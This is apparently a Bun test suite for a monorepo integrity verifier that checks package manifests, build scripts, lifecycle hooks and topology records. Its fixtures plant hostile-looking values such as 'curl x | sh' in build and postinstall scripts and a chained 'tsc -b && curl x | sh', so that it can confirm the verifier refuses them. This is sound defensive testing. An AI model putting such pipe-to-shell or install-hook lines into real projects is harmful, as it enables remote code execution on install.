import { describe, expect, test } from 'bun:test'
import { IntegrityRule, TARGET_LIBRARY_BUILD_SCRIPT, TARGET_PACKAGES_DIR, TargetLayout, TargetPackage } from '../src/integrity/consts.js'
import { TARGET_BUILD_SCRIPTS, TARGET_ENTRY_MARKERS, TARGET_INTEGRITY_FILES, TARGET_PROTECTED_FILES } from '../src/integrity/layout/consts.js'
import { targetLayoutHelper } from '../src/integrity/layout.js'
import type { TargetFileMap, TargetIntegrityReport } from '../src/integrity/types.js'
import { targetIntegrityHelper, verifyTargetShape } from '../src/integrity/verify.js'
import { TOPOLOGY_FILE } from '../src/metadata/consts.js'
import { appMapHelper } from '../src/topology/apps.js'
import type { AppMap } from '../src/topology/apps/types.js'
import { DEFAULT_TOPOLOGY } from '../src/topology/consts.js'
import { topologyHelper } from '../src/topology/resolve.js'
import type { TopologyDescriptor } from '../src/topology/types.js'
import { SubProject } from '../src/slot/consts.js'

/**
 * The manifest follows the topology record: a tree whose record splits it into apps, or names a
 * package beyond the five core ones, is verified against every package the record names — and a tree
 * with no record, or a record of the five core packages and one app, gets exactly the report it
 * always got.
 *
 * The tree is synthetic: every file the V2 manifest reads, carrying exactly the names, scripts,
 * dependencies and markers the manifest asserts, plus a copy of main's web/api per extra app — the
 * shape the stager produces.
 */
const SLUG = 'shop'
const AT = '2026-11-11T10:00:00.000Z'

const manifestOf = (pkg: string, rules: string): string => JSON.stringify({
  name: targetLayoutHelper.targetPackageName(SLUG, pkg),
  type: 'module',
  scripts: { build: TARGET_BUILD_SCRIPTS[rules], dev: 'nodemon' },
  dependencies: Object.fromEntries(targetLayoutHelper.targetRequiredDeps(SLUG, rules).map(dep => [dep, '^1.0.0'])),
})

/** One package's files: main's manifest list and markers, re-rooted at `dir`. */
const packageFiles = (dir: string, rules: string): TargetFileMap => {
  const prefix = `${TARGET_PACKAGES_DIR}/${rules}/`
  const files: TargetFileMap = {}
  for (const path of targetLayoutHelper.targetManifest(TargetLayout.V2).files) {
    if (!path.startsWith(prefix)) continue
    const rel = path.slice(prefix.length)
    const target = `${TARGET_PACKAGES_DIR}/${dir}/${rel}`
    files[target] = rel === 'package.json' ? manifestOf(dir, rules)
      : rel === 'tsconfig.json' ? '{}'
        : (TARGET_ENTRY_MARKERS[path] ?? ['export {}']).join('\n')
  }

  return files
}

const topologyOf = (map: AppMap | null): TopologyDescriptor => map == null
  ? DEFAULT_TOPOLOGY
  : { ...DEFAULT_TOPOLOGY, packages: [...DEFAULT_TOPOLOGY.packages, ...appMapHelper.packagesOf(map)], areas: map.areas, apps: map.apps }

/** The record as JSON in the frontmatter — YAML's flow style, which the reader takes as well. */
const recordOf = (topology: unknown): string => `---\n${JSON.stringify(topology)}\n---\n\n# Topology\n`

const baseTree = (): TargetFileMap => {
  const files: TargetFileMap = Object.fromEntries(TARGET_INTEGRITY_FILES.map(path => [path, null]))
  files['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: [`${TARGET_PACKAGES_DIR}/*`] })
  files['bunfig.toml'] = '[install]\nlinker = "hoisted"\n'
  for (const pkg of Object.values(TargetPackage)) Object.assign(files, packageFiles(pkg, pkg))

  return files
}

/** A staged tree of the default split: main + admin + backoffice, the record naming all three. */
const splitTree = (map: AppMap = appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator'])): TargetFileMap => {
  const files = baseTree()
  files[TOPOLOGY_FILE] = recordOf({ ...topologyOf(map), version: 1, updatedAt: AT })
  for (const app of map.apps) {
    if (app.name === 'main') continue
    Object.assign(files, packageFiles(app.web, TargetPackage.Web), packageFiles(app.api, TargetPackage.Api))
  }

  return files
}

const SPLIT_DIRS = [...Object.values(TargetPackage), 'admin-web', 'admin-api', 'backoffice-web', 'backoffice-api']

/** A clean manifest of a package the record names beyond the core and app ones. */
const libraryManifest = (dir: string, scripts: Record<string, string> = { build: TARGET_LIBRARY_BUILD_SCRIPT }): string =>
  JSON.stringify({ name: targetLayoutHelper.targetPackageName(SLUG, dir), type: 'module', scripts })

const lines = (report: TargetIntegrityReport): string[] => report.violations.map(v => `${v.rule} ${v.path}: ${v.detail}`)
const rulesOf = (report: TargetIntegrityReport): string[] => report.violations.map(v => v.rule)

const memoryFs = (files: TargetFileMap, dirs: string[]) => ({
  read: async (path: string): Promise<string | null> => files[path] ?? null,
  list: async (dir: string): Promise<string[]> => dir === TARGET_PACKAGES_DIR ? dirs : [],
})

describe('viable-common - integrity, a tree with no split', () => {
  test('the synthetic V2 tree verifies clean, with or without a record of the default topology', () => {
    expect(lines(verifyTargetShape(baseTree()))).toEqual([])
    expect(lines(verifyTargetShape({ ...baseTree(), [TOPOLOGY_FILE]: recordOf(DEFAULT_TOPOLOGY) }))).toEqual([])
  })

  test('the record is read but never required', () => {
    expect(TARGET_INTEGRITY_FILES).toContain(TOPOLOGY_FILE)
    const empty = verifyTargetShape(Object.fromEntries(TARGET_INTEGRITY_FILES.map(path => [path, null])))
    expect(empty.violations.filter(v => v.rule === IntegrityRule.Missing))
      .toHaveLength(targetLayoutHelper.targetManifest(TargetLayout.V2).files.length)
    expect(empty.violations.some(v => v.path === TOPOLOGY_FILE)).toBe(false)
  })

  test('no record, a record without apps, a record of main alone, an unreadable record: one report', () => {
    const broken = baseTree()
    broken['sources/web/package.json'] = broken['sources/web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['sources/api/src/index.ts'] = null
    broken['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: ['sources/common'], scripts: { postinstall: 'x' } })
    const records = [
      undefined,
      null,
      recordOf(DEFAULT_TOPOLOGY),
      recordOf({ ...DEFAULT_TOPOLOGY, apps: appMapHelper.legacy().apps, areas: appMapHelper.legacy().areas }),
      recordOf({ ...DEFAULT_TOPOLOGY, apps: [appMapHelper.legacy().apps[0], 'garbage'] }),
      '---\napps: [ {\n---\n',
      'no frontmatter at all',
    ]
    for (const tree of [baseTree(), broken]) {
      const expected = verifyTargetShape(Object.fromEntries(Object.entries(tree).filter(([path]) => path !== TOPOLOGY_FILE)))
      for (const record of records) {
        const files = record === undefined ? { ...tree } : { ...tree, [TOPOLOGY_FILE]: record }
        expect(verifyTargetShape(files)).toEqual(expected)
        // A listing alone changes nothing either: the refusal belongs to split trees, and a stray is
        // checked for lifecycle scripts only once its manifest was read.
        expect(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: ['evil'] })).toEqual(expected)
        expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: [], listWorkspace: true })
      }
    }
  })

  test('the broken legacy report is pinned as it stood before apps', () => {
    const broken = baseTree()
    broken['sources/web/package.json'] = broken['sources/web/package.json']!.replace('bun ./rollup.build.mjs', 'curl x | sh')
    broken['sources/api/src/index.ts'] = null
    broken['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: ['sources/common'], scripts: { postinstall: 'x' } })
    expect(lines(verifyTargetShape(broken))).toEqual([
      'missing sources/api/src/index.ts: sources/api/src/index.ts is missing — a Viable project always has it.',
      'workspaces package.json: The root package must declare the workspaces as ["sources/*"] or as exactly '
        + 'sources/common, sources/backend, sources/api, sources/web, sources/worker.',
      'lifecycle-script package.json: Lifecycle script "postinstall" is not allowed in a target project.',
      'build-script sources/web/package.json: The build script of "web" must be exactly `bun ./rollup.build.mjs`.',
    ])
  })

  test('a V1 tree is never read as split, whatever its record says — and never lists sources/', () => {
    const v1: TargetFileMap = { 'packages/backend/package.json': '{}', [TOPOLOGY_FILE]: splitTree()[TOPOLOGY_FILE] }
    expect(targetIntegrityHelper.readPlan(v1)).toEqual({ extraFiles: [], listWorkspace: false })
    expect(verifyTargetShape(v1)).toEqual(verifyTargetShape({ 'packages/backend/package.json': '{}' }))
  })
})

describe('viable-common - integrity, a tree split into apps', () => {
  test('a staged three-app tree verifies clean, listing included', () => {
    const files = splitTree()
    expect(verifyTargetShape(files).layout).toBe(TargetLayout.V2)
    expect(lines(verifyTargetShape(files))).toEqual([])
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, '.cache'] }))).toEqual([])
  })

  test('the record in the writer\'s block YAML is read the same way', () => {
    const files = splitTree()
    const yaml = [
      '---', 'id: owlmeans-fullstack', 'dir: sources', 'packages:',
      ...topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator'])).packages.flatMap(pkg => [
        `  - name: ${pkg.name}`, '    roles:', ...pkg.roles.map(role => `      - ${role}`), `    kind: ${pkg.kind}`,
        pkg.dependsOn.length === 0 ? '    dependsOn: []' : '    dependsOn:', ...pkg.dependsOn.map(dep => `      - ${dep}`),
        ...(pkg.app != null ? [`    app: ${pkg.app}`, `    mount: ${pkg.mount}`] : []),
      ]),
      'apps:',
      ...appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']).apps.flatMap(app => [
        `  - name: ${app.name}`, `    mount: "${app.mount}"`, '    areas:', ...app.areas.map(area => `      - ${area}`),
        `    web: ${app.web}`, `    api: ${app.api}`, `    index: ${app.index}`,
      ]),
      'version: 1', `updatedAt: ${AT}`, '---', '', '# Topology', '',
    ].join('\n')
    files[TOPOLOGY_FILE] = yaml
    expect(targetIntegrityHelper.readPlan(files).listWorkspace).toBe(true)
    expect(lines(verifyTargetShape(files))).toEqual([])
  })

  test('the plan names every app package file and asks for the listing', () => {
    const plan = targetIntegrityHelper.readPlan(splitTree())
    expect(plan.listWorkspace).toBe(true)
    expect(plan.extraFiles).toHaveLength(32)
    expect(plan.extraFiles).toContain('sources/admin-web/src/index.tsx')
    expect(plan.extraFiles).toContain('sources/backoffice-api/rollup.build.mjs')
    expect(plan.extraFiles.every(path => !TARGET_INTEGRITY_FILES.includes(path))).toBe(true)
  })

  test('collecting reads the base set, then the app packages, the listing and every stray manifest', async () => {
    const files = splitTree()
    files['sources/evil/package.json'] = JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl x | sh' } })
    const reads: string[] = []
    const fs = memoryFs(files, [...SPLIT_DIRS, 'evil', 'empty', '.git'])
    const collected = await targetIntegrityHelper.collectTargetFiles(async path => {
      reads.push(path)

      return await fs.read(path)
    }, fs.list)
    expect(collected.workspaceDirs).toEqual([...SPLIT_DIRS, 'evil', 'empty', '.git'])
    expect(collected.files['sources/admin-api/src/owlmeans.ts']).toBe(files['sources/admin-api/src/owlmeans.ts'])
    expect(collected.files['sources/empty/package.json']).toBeNull()
    expect(reads).not.toContain('sources/.git/package.json')
    expect(lines(targetIntegrityHelper.verifyTargetShape(collected.files, collected))).toEqual([
      'workspace-package sources/evil/package.json: sources/evil/package.json is a workspace package the topology record does not name.',
    ])
  })

  test('collecting a tree with no record reads the base set, lists sources/ and reads nothing more for the core', async () => {
    const reads: string[] = []
    const listed: string[] = []
    const collected = await targetIntegrityHelper.collectTargetFiles(async path => {
      reads.push(path)

      return baseTree()[path] ?? null
    }, async dir => {
      listed.push(dir)

      return Object.values(TargetPackage)
    })
    expect(listed).toEqual([TARGET_PACKAGES_DIR])
    expect(collected.workspaceDirs).toEqual(Object.values(TargetPackage))
    expect(reads.sort()).toEqual([...TARGET_INTEGRITY_FILES].sort())
    // A clean core-only tree: the same report, byte for byte, listing or not.
    expect(JSON.stringify(verifyTargetShape(collected.files, collected))).toBe(JSON.stringify(verifyTargetShape(baseTree())))
  })

  test('a caller that never read the app packages fails closed — on split trees only', () => {
    const files = Object.fromEntries(Object.entries(splitTree()).filter(([path]) => TARGET_INTEGRITY_FILES.includes(path)))
    const report = verifyTargetShape(files)
    expect(report.ok).toBe(false)
    expect(report.violations.filter(v => v.rule === IntegrityRule.Missing)).toHaveLength(32)
    expect(report.violations[0].detail).toContain('the app "admin" always has it')
  })

  test('every app package is held to main\'s web and api rules', () => {
    const files = splitTree()
    files['sources/admin-web/package.json'] = JSON.stringify({
      name: 'shop-admin', type: 'commonjs', scripts: { build: 'bun ./rollup.build.mjs && curl x | sh', prepare: 'x' }, dependencies: {},
    })
    files['sources/backoffice-api/src/index.ts'] = 'console.log(1)'
    files['sources/backoffice-api/rollup.config.js'] = 'export default { input: "evil.ts" }'
    expect(lines(verifyTargetShape(files))).toEqual([
      'package-name sources/admin-web/package.json: Package must be named "shop-admin-web", not "shop-admin".',
      'module-type sources/admin-web/package.json: Package "admin-web" must declare "type": "module".',
      'build-script sources/admin-web/package.json: The build script of "admin-web" must be exactly `bun ./rollup.build.mjs`.',
      'lifecycle-script sources/admin-web/package.json: Lifecycle script "prepare" is not allowed in a target project.',
      'required-dependency sources/admin-web/package.json: Package "admin-web" must depend on @owlmeans/web-client.',
      'required-dependency sources/admin-web/package.json: Package "admin-web" must depend on shop-common.',
      'entry-marker sources/backoffice-api/src/index.ts: sources/backoffice-api/src/index.ts does not look like the generated app\'s entry: ./owlmeans.js, initOwlMeans not found.',
      'entry-marker sources/backoffice-api/rollup.config.js: sources/backoffice-api/rollup.config.js does not look like the generated app\'s entry: index.ts, dist, index.js not found.',
    ])
  })

  test('a written-out workspace list has to name every app package', () => {
    const files = splitTree()
    const core = Object.values(TargetPackage).map(pkg => `sources/${pkg}`)
    files['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: core })
    expect(rulesOf(verifyTargetShape(files))).toEqual([IntegrityRule.Workspaces])
    files['package.json'] = JSON.stringify({ name: SLUG, type: 'module', workspaces: SPLIT_DIRS.map(dir => `sources/${dir}`) })
    expect(lines(verifyTargetShape(files))).toEqual([])
  })
})

describe('viable-common - integrity, the app-map rule', () => {
  const withRecord = (mutate: (topology: TopologyDescriptor & { apps: unknown[] }) => void): TargetIntegrityReport => {
    const files = splitTree()
    const topology = { ...topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator'])), version: 1, updatedAt: AT } as
      TopologyDescriptor & { apps: unknown[] }
    mutate(topology)
    files[TOPOLOGY_FILE] = recordOf(topology)

    return verifyTargetShape(files)
  }
  const appMapLines = (report: TargetIntegrityReport): string[] =>
    report.violations.filter(v => v.rule === IntegrityRule.AppMap).map(v => `${v.path}: ${v.detail}`)

  test('a duplicate mount, name or index', () => {
    expect(appMapLines(withRecord(t => { (t.apps[2] as { mount: string }).mount = 'admin' }))).toEqual([
      `${TOPOLOGY_FILE}: The mount "/admin" is claimed 2 times.`,
    ])
    expect(appMapLines(withRecord(t => { (t.apps[2] as { index: number }).index = 1 }))).toEqual([
      `${TOPOLOGY_FILE}: The index 1 is claimed 2 times.`,
    ])
    expect(appMapLines(withRecord(t => { t.apps.push({ ...(t.apps[1] as object) }) }))).toEqual([
      `${TOPOLOGY_FILE}: The app name "admin" is listed 2 times.`,
      `${TOPOLOGY_FILE}: The mount "/admin" is claimed 2 times.`,
      `${TOPOLOGY_FILE}: The index 1 is claimed 2 times.`,
      `${TOPOLOGY_FILE}: The package "admin-web" is named 2 times.`,
      `${TOPOLOGY_FILE}: The package "admin-api" is named 2 times.`,
    ])
  })

  test('a reserved or ill-shaped mount', () => {
    expect(appMapLines(withRecord(t => { (t.apps[1] as { mount: string }).mount = 'dispatcher' }))).toEqual([
      `${TOPOLOGY_FILE}: The app "admin" may not be mounted at the reserved path "/dispatcher".`,
    ])
    expect(appMapLines(withRecord(t => { (t.apps[1] as { mount: string }).mount = 'Admin/x' }))).toEqual([
      `${TOPOLOGY_FILE}: The app "admin" has an ill-shaped mount "Admin/x" — one lower-case path segment.`,
    ])
  })

  test('an index outside 1..9', () => {
    expect(appMapLines(withRecord(t => { (t.apps[1] as { index: number }).index = 10 }))).toEqual([
      `${TOPOLOGY_FILE}: The app "admin" has the index 10, outside 1..9.`,
    ])
    expect(appMapLines(withRecord(t => { (t.apps[2] as { index: number }).index = 0 }))).toContain(
      `${TOPOLOGY_FILE}: The app "backoffice" has the index 0, outside 1..9.`,
    )
  })

  test('an app package the record\'s packages do not name, or not named after its app', () => {
    expect(appMapLines(withRecord(t => { t.packages = t.packages.filter(pkg => pkg.name !== 'admin-web') }))).toEqual([
      `${TOPOLOGY_FILE}: The app "admin"'s package "admin-web" is not among the record's packages.`,
    ])
    expect(appMapLines(withRecord(t => { (t.apps[1] as { web: string }).web = 'panel-web' }))).toEqual([
      `${TOPOLOGY_FILE}: The app "admin" names the package "panel-web" — it must be "admin-web".`,
    ])
  })

  test('an entry that is no app, a missing main, packages outside sources', () => {
    expect(appMapLines(withRecord(t => { t.apps.push('garbage', { name: 'x' }) }))).toEqual([
      `${TOPOLOGY_FILE}: 2 entries of the record's apps list are not apps.`,
    ])
    expect(appMapLines(withRecord(t => { (t.apps[0] as { name: string }).name = 'home' }))).toContain(
      `${TOPOLOGY_FILE}: The record's apps list has no "main" app at the host's root with index 0.`,
    )
    expect(appMapLines(withRecord(t => { t.dir = 'packages' }))).toContain(
      `${TOPOLOGY_FILE}: A project split into apps keeps its packages under sources/.`,
    )
  })
})

describe('viable-common - integrity, the workspace-package rule', () => {
  test('a package nobody recorded is refused; a directory with no manifest is not', () => {
    const files = splitTree()
    files['sources/evil/package.json'] = '{}'
    files['sources/empty/package.json'] = null
    const report = targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'evil', 'empty', '.hidden'] })
    expect(lines(report)).toEqual([
      'workspace-package sources/evil/package.json: sources/evil/package.json is a workspace package the topology record does not name.',
    ])
  })

  test('a listed directory nobody looked into is assumed to hold a package', () => {
    const report = targetIntegrityHelper.verifyTargetShape(splitTree(), { workspaceDirs: [...SPLIT_DIRS, 'unread'] })
    expect(rulesOf(report)).toEqual([IntegrityRule.WorkspacePackage])
  })

  test('a package the record names (an adopted one) passes, and no listing means no check', () => {
    const files = splitTree()
    const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
    files[TOPOLOGY_FILE] = recordOf({ ...topology, packages: [...topology.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] })
    files['sources/tools/package.json'] = libraryManifest('tools')
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'tools'] }))).toEqual([])
    expect(lines(verifyTargetShape(splitTree()))).toEqual([])
  })
})

describe('viable-common - integrity, protected files follow the record', () => {
  test('no record: exactly the static list', () => {
    expect(targetIntegrityHelper.protectedFilesOf(null)).toEqual([...TARGET_PROTECTED_FILES])
    expect(targetIntegrityHelper.protectedFilesOf(DEFAULT_TOPOLOGY)).toEqual([...TARGET_PROTECTED_FILES])
  })

  test('a split record adds each app package\'s manifest, compiler and rollup files', () => {
    const files = targetIntegrityHelper.protectedFilesOf(topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator'])))
    const added = files.filter(path => !TARGET_PROTECTED_FILES.includes(path))
    expect(added).toHaveLength(16)
    expect(added).toContain('sources/admin-web/package.json')
    expect(added).toContain('sources/admin-api/tsconfig.json')
    expect(added).toContain('sources/backoffice-web/rollup.config.js')
    expect(added).toContain('sources/backoffice-api/rollup.build.mjs')
    expect(files.slice(0, TARGET_PROTECTED_FILES.length)).toEqual([...TARGET_PROTECTED_FILES])
  })
})

/** A one-app tree whose record names packages beyond the five core ones — the way adoption writes it. */
describe('viable-common - integrity, a one-app tree verified against its record', () => {
  const CORE_DIRS: string[] = Object.values(TargetPackage)
  type Extra = { name: string, kind: 'library' | 'bundle', roles?: string[] }

  const recordTree = (extras: Extra[], manifests: Record<string, string | null> = {}): TargetFileMap => {
    const files = baseTree()
    files[TOPOLOGY_FILE] = recordOf({
      ...DEFAULT_TOPOLOGY,
      packages: [
        ...DEFAULT_TOPOLOGY.packages,
        ...extras.map(extra => ({ name: extra.name, roles: extra.roles ?? ['common'], kind: extra.kind, dependsOn: ['common'] })),
      ],
      version: 1, updatedAt: AT,
    })
    for (const extra of extras) files[`sources/${extra.name}/package.json`] = libraryManifest(extra.name)
    Object.assign(files, manifests)

    return files
  }
  const listed = (...dirs: string[]) => ({ workspaceDirs: [...CORE_DIRS, ...dirs] })

  test('a clean adopted library passes; the plan reads its manifest and lists sources/', () => {
    const files = recordTree([{ name: 'tools', kind: 'library' }])
    expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: ['sources/tools/package.json'], listWorkspace: true })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([])
  })

  test('collecting reads the adopted manifest in pass two and lists the workspace', async () => {
    const files = recordTree([{ name: 'tools', kind: 'library' }])
    const fs = memoryFs(files, [...CORE_DIRS, 'tools'])
    const collected = await targetIntegrityHelper.collectTargetFiles(fs.read, fs.list)
    expect(collected.workspaceDirs).toEqual([...CORE_DIRS, 'tools'])
    expect(collected.files['sources/tools/package.json']).toBe(files['sources/tools/package.json'])
    expect(lines(targetIntegrityHelper.verifyTargetShape(collected.files, collected))).toEqual([])
  })

  test('a library whose build only CONTAINS tsc -b is refused — exact, never a substring', () => {
    const files = recordTree([{ name: 'tools', kind: 'library' }], {
      'sources/tools/package.json': libraryManifest('tools', { build: 'tsc -b && curl x | sh' }),
    })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([
      'build-script sources/tools/package.json: The build script of "tools" must be exactly `tsc -b` — the topology record names it a library.',
    ])
  })

  test('an adopted library keeps its own name and module type; an install hook is refused', () => {
    const files = recordTree([{ name: 'tools', kind: 'library' }], {
      'sources/tools/package.json': JSON.stringify({ name: '@acme/tools', scripts: { build: '  tsc -b ' } }),
    })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([])
    files['sources/tools/package.json'] = JSON.stringify({ name: '@acme/tools', scripts: { build: 'tsc -b', postinstall: 'curl x | sh' } })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools')))).toEqual([
      'lifecycle-script sources/tools/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
    ])
  })

  test('an unclassified bundle with lifecycle scripts is refused; its build is never asked about', () => {
    const files = recordTree([{ name: 'reports', kind: 'bundle', roles: ['worker'] }], {
      'sources/reports/package.json': JSON.stringify({ name: 'whatever', scripts: { build: 'curl x | sh', preinstall: 'x', prepare: 'y' } }),
    })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('reports')))).toEqual([
      'lifecycle-script sources/reports/package.json: Lifecycle script "preinstall" is not allowed in a target project.',
      'lifecycle-script sources/reports/package.json: Lifecycle script "prepare" is not allowed in a target project.',
    ])
    files['sources/reports/package.json'] = JSON.stringify({ name: 'whatever', scripts: { build: 'curl x | sh' } })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('reports')))).toEqual([])
  })

  test('a library directory with no manifest is missing; an absent one is nothing the platform builds', () => {
    const files = recordTree([{ name: 'tools', kind: 'library' }, { name: 'reports', kind: 'bundle' }], {
      'sources/tools/package.json': null, 'sources/reports/package.json': null,
    })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'reports')))).toEqual([
      'missing sources/tools/package.json: sources/tools/package.json is missing — the topology record names the library "tools".',
    ])
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed()))).toEqual([])
  })

  test('a caller that never read the record\'s packages fails closed', () => {
    const files = Object.fromEntries(Object.entries(recordTree([{ name: 'tools', kind: 'library' }]))
      .filter(([path]) => TARGET_INTEGRITY_FILES.includes(path)))
    expect(rulesOf(verifyTargetShape(files))).toEqual([IntegrityRule.Missing])
  })

  test('beside an adopted package, one nobody recorded yet is an unclassified bundle — never a refusal by itself', () => {
    // The next pull's package: accepted, then adopted. Only its lifecycle scripts are asked about.
    const files = recordTree([{ name: 'tools', kind: 'library' }], { 'sources/stray/package.json': JSON.stringify({ name: 'x', scripts: { build: 'curl x | sh' } }) })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'stray')))).toEqual([])
    files['sources/stray/package.json'] = JSON.stringify({ name: 'x', scripts: { postinstall: 'curl x | sh' } })
    expect(lines(targetIntegrityHelper.verifyTargetShape(files, listed('tools', 'stray')))).toEqual([
      'lifecycle-script sources/stray/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
    ])
  })

  test('the five core packages in any order, a record outside sources/ and a V1 tree keep the one-pass report', () => {
    const shuffled = { ...DEFAULT_TOPOLOGY, packages: [...DEFAULT_TOPOLOGY.packages].reverse() }
    const elsewhere = { ...DEFAULT_TOPOLOGY, dir: 'lib', packages: [...DEFAULT_TOPOLOGY.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] }
    for (const record of [recordOf(shuffled), recordOf(elsewhere)]) {
      const files = { ...baseTree(), [TOPOLOGY_FILE]: record }
      expect(targetIntegrityHelper.readPlan(files)).toEqual({ extraFiles: [], listWorkspace: true })
      expect(targetIntegrityHelper.verifyTargetShape(files, listed('evil'))).toEqual(verifyTargetShape(baseTree()))
    }
    const v1: TargetFileMap = { 'packages/backend/package.json': '{}', [TOPOLOGY_FILE]: recordTree([{ name: 'tools', kind: 'library' }])[TOPOLOGY_FILE] }
    expect(targetIntegrityHelper.readPlan(v1)).toEqual({ extraFiles: [], listWorkspace: false })
  })

  test('a split tree verifies the other packages the record names as well', () => {
    const files = splitTree()
    const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
    files[TOPOLOGY_FILE] = recordOf({ ...topology, packages: [...topology.packages, { name: 'tools', roles: ['common'], kind: 'library', dependsOn: [] }] })
    files['sources/tools/package.json'] = libraryManifest('tools', { build: 'tsc -b; sh x' })
    expect(targetIntegrityHelper.readPlan(files).extraFiles).toHaveLength(33)
    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'tools'] }))).toEqual([IntegrityRule.BuildScript])
  })
})

describe('viable-common - integrity, what the platform builds of a record', () => {
  const build = (topology: TopologyDescriptor) => targetIntegrityHelper.buildOrderOf(topology)
  const withExtras = (extras: TopologyDescriptor['packages']): TopologyDescriptor =>
    ({ ...DEFAULT_TOPOLOGY, packages: [...DEFAULT_TOPOLOGY.packages, ...extras] })

  test('the five core packages build in their order, unchanged', () => {
    expect(build(DEFAULT_TOPOLOGY)).toEqual(['common', 'backend', 'api', 'web', 'worker'])
  })

  test('an adopted library builds; an unclassified bundle never does', () => {
    expect(build(withExtras([
      { name: 'tools', roles: [SubProject.Common], kind: 'library', dependsOn: ['common'] },
      { name: 'reports', roles: [SubProject.Worker], kind: 'bundle', dependsOn: ['common'] },
    ]))).toEqual(['common', 'backend', 'api', 'web', 'worker', 'tools'])
  })

  test('the app packages of a split record build like main\'s', () => {
    const topology = topologyOf(appMapHelper.defaultFor(['guest', 'user', 'admin', 'operator']))
    expect(build(topology)).toEqual(topologyHelper.resolveTopology(topology).build)
    expect(build(topology)).toContain('admin-web')
    // The same packages with no valid map are no app's: never built.
    expect(build({ ...topology, apps: undefined, areas: undefined })).not.toContain('admin-web')
  })
})

/** Every V2 tree lists `sources/`: a package nobody recorded is still installed by the workspace glob. */
describe('viable-common - integrity, packages nobody recorded in a tree that is not split', () => {
  const CORE_DIRS: string[] = Object.values(TargetPackage)

  test('a clean core-only tree reports byte for byte as before, with the listing', () => {
    const files = baseTree()
    expect(JSON.stringify(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: CORE_DIRS })))
      .toBe(JSON.stringify(verifyTargetShape(files)))
  })

  test('a stray with a lifecycle script is refused; a quiet one, or a directory with no manifest, is not', async () => {
    const files = baseTree()
    files['sources/evil/package.json'] = JSON.stringify({ name: 'evil', scripts: { build: 'curl x | sh', postinstall: 'curl y | sh' } })
    files['sources/quiet/package.json'] = JSON.stringify({ name: 'quiet', scripts: { build: 'curl x | sh' } })
    const fs = memoryFs(files, [...CORE_DIRS, 'evil', 'quiet', 'empty'])
    const collected = await targetIntegrityHelper.collectTargetFiles(fs.read, fs.list)

    expect(collected.files['sources/evil/package.json']).toBe(files['sources/evil/package.json'])
    expect(collected.files['sources/empty/package.json']).toBeNull()
    expect(lines(targetIntegrityHelper.verifyTargetShape(collected.files, collected))).toEqual([
      'lifecycle-script sources/evil/package.json: Lifecycle script "postinstall" is not allowed in a target project.',
    ])
  })

  test('a stray manifest nobody can parse is refused — Bun reads what JSON.parse does not', () => {
    const files = { ...baseTree(), 'sources/evil/package.json': '{ "scripts": { "postinstall": "curl x | sh", }, }' }
    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...CORE_DIRS, 'evil'] }))).toEqual([IntegrityRule.Unreadable])
  })

  test('a tree split into apps keeps refusing what its record does not name', () => {
    const files = { ...splitTree(), 'sources/quiet/package.json': JSON.stringify({ name: 'quiet' }) }
    expect(rulesOf(targetIntegrityHelper.verifyTargetShape(files, { workspaceDirs: [...SPLIT_DIRS, 'quiet'] }))).toEqual([IntegrityRule.WorkspacePackage])
  })
})
